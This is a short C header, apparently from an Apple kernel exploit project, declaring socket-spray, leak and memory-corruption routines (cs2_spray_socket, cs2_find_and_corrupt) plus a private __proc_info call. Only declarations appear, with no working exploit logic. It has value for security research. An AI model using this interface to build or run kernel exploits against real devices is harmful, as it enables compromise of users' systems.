#ifndef cs2_socket_h
#define cs2_socket_h

#include "common.h"

#define CS2_PROC_INFO_CALL_PIDFILEPORTINFO 0x6
#define CS2_PROC_PIDFILEPORTSOCKETINFO 0x3
extern int __proc_info(int callnum, int pid, int flavor, uint64_t arg, void* buffer, int buffer_size);

void cs2_sockets_leak_forever(void);
uint64_t cs2_spray_socket(void);
void cs2_sockets_release(void);
kern_return_t cs2_find_and_corrupt(mach_port_t memory_object, mach_vm_offset_t seeking_offset, uint8_t* read_buffer, uint8_t* write_buffer, uint64_t target_inp_gencnt_list[CS2_MAX_SOCKETS_COUNT],
                                      size_t* target_inp_gencnt_count, bool do_read);

#endif /* cs2_socket_h */
